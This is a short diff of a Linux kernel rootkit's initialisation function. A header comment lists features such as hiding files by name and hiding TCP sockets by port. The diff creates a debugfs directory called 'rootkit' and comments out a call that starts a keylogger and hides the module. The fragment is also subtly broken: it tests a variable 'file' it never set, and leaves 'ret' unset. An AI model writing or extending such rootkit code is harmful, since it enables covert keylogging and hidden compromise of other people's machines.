@@ -8,11 +8,22 @@ fetures such as:
 3. hide file by the name provide
 4. hide tcp sockets by port 
 */
+
+
 static int __init start_rootkit(void)
 {
     int ret;
+    subdir = debugfs_create_dir("rootkit", NULL);
+    if (!file)
+    {
+        debugfs_remove_recursive(subdir);
+        return -ENOENT;
+    }
+    
+
+
     //KEYLOGGER AND HIDE THE MODULE
-    ret = run_keylogger();
+    //ret = run_keylogger();
     if (ret ==-1)
     {
         printk(KERN_ALERT "rk: keylogger could not load!");
